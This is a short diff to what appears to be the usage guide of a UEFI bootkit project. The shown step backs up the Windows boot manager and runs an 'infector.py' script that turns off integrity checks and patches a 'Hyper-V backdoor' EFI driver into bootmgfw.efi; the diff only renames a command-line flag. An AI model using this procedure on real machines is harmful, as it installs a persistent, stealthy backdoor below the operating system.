@@ -157,7 +157,7 @@ C:\> copy S:\EFI\Microsoft\Boot\bootmgfw.efi S:\EFI\Microsoft\Boot\bootmgfw_orig
 Infect original image file with Hyper-V backdoor:
 
 ```
-C:\> python .\infector.py --patch-integrity-checks --driver .\DmaBackdoorHv_X64.efi ^ 
+C:\> python .\infector.py --patch-integrity-checks --dxe-driver .\DmaBackdoorHv_X64.efi ^ 
      --infect S:\EFI\Microsoft\Boot\bootmgfw_orig.efi ^
      --output S:\EFI\Microsoft\Boot\bootmgfw.efi
 
